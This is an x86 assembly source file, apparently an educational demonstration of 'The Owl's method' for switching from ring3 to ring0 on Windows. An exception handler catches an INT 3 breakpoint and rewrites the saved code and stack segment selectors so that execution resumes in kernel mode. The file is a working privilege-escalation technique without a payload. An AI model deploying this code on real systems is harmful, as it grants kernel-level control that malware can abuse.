.386p
.MODEL FLAT,STDCALL
locals
jumps
UNICODE=0
include w32.inc

Extrn SetUnhandledExceptionFilter : PROC

.data

message1        db "An example of switching into Ring0 by means of the SEH (The Owl's method)",0
message2        db "RING0 was successfully activated",0


.code

Start:

                xor  eax,eax                    ;nulls the eax register because the new SEH service is set

                push offset xhandler            ;address for your new SEH service (xhandler)

                push dword ptr fs:[eax]         ;saves the address of the original SHE service

                mov  dword ptr fs:[eax],esp     ;sets the new SEH service

                pushfd                          ;saves the EFLAGS

                mov  eax,esp                    ;saves the ESP register (stack address)

                int  3h                         ;causes an error and will also call your new SEH service (xhandler)

;-----------------------------------------------------------------------------
;ODTIALTO UZ PROGRAM BEZI V RING0
;-----------------------------------------------------------------------------

                mov  ebx,dr7                    ;tests to see if you are really in ring0
                                                ;and restores the original register values for ring3
                push edx                        ; GS
                push edx                        ; FS
                push edx                        ; ES
                push edx                        ; DS
                push edx                        ; SS
                push eax                        ; ESP
                push dword ptr [eax]            ; EFLAGS
                push ecx                        ; CS
                push offset ring3               ; EIP = address where it will jump back into ring3

                iretd                           ;jump back into ring3


;-----------------------------------------------------------------------------
;From here the program runs again in ring3
;-----------------------------------------------------------------------------
ring3:

                popfd                           ;restores EFLAGS

                pop  dword ptr fs:[0]           ;sets the original SEH service
                add  esp,4                      ;clears the stack


                call MessageBoxA,0, offset message2, offset message1,0



                call ExitProcess, -1            ;Ends program



;-----------------------------------------------------------------------------
;Your new SEH service (xhandler)
;-----------------------------------------------------------------------------
xhandler:

                push ebp                        ;sets the stack
                mov  ebp,esp                    ;and finds its address
                push ebx
                push ecx

                mov  ebx,[ebp+8]                ;reads the address containing the information about the error, which is the exception location or address

                cmp  dword ptr [ebx],80000003h  ;tests to see if EXCEPTION_BREAKPOINT was the error caused by INT 3h
                jne  end                        ;if not the program jumps

                mov  eax,[ebp+10h]              ;reads the address of the beginning of the context

                movzx ecx,word ptr [eax+0bch]   ;reads Seg.Cs from the Context

                mov  [eax+0ach],ecx             ;saves .ECX into the Context (this value will be in the ECX after switching into ring3)

                mov  dword ptr [eax+0bch],28h   ;saves Seg.Cs into the Context (this value will be in the CS register). This will secure switch over into ring0.

                movzx ecx, word ptr [eax+0c8h]  ;reads Seg.SS from the Context

                mov  [eax+0a8h],ecx             ;saves .EDX into the Context (this value will be in the EDX after switching into the ring3

                mov  dword ptr [eax+0c8h],30h   ;saves Seg.SS into the Context (this value will be in the SS register). This will secure a switch over into ring0.

                or   dword ptr [eax+0c0h],0200h ;sets CLI into the Context.EFLAGS (this value will be in the EFLAGS register

                mov  eax,0                      ;nulls EAX

end:

                pop  ecx                        ;clears the stack
                pop  ebx
                mov  esp,ebp
                pop  ebp

                retn                            ;jumps back into the program, but the example program will continue running in ring0




ends
end Start
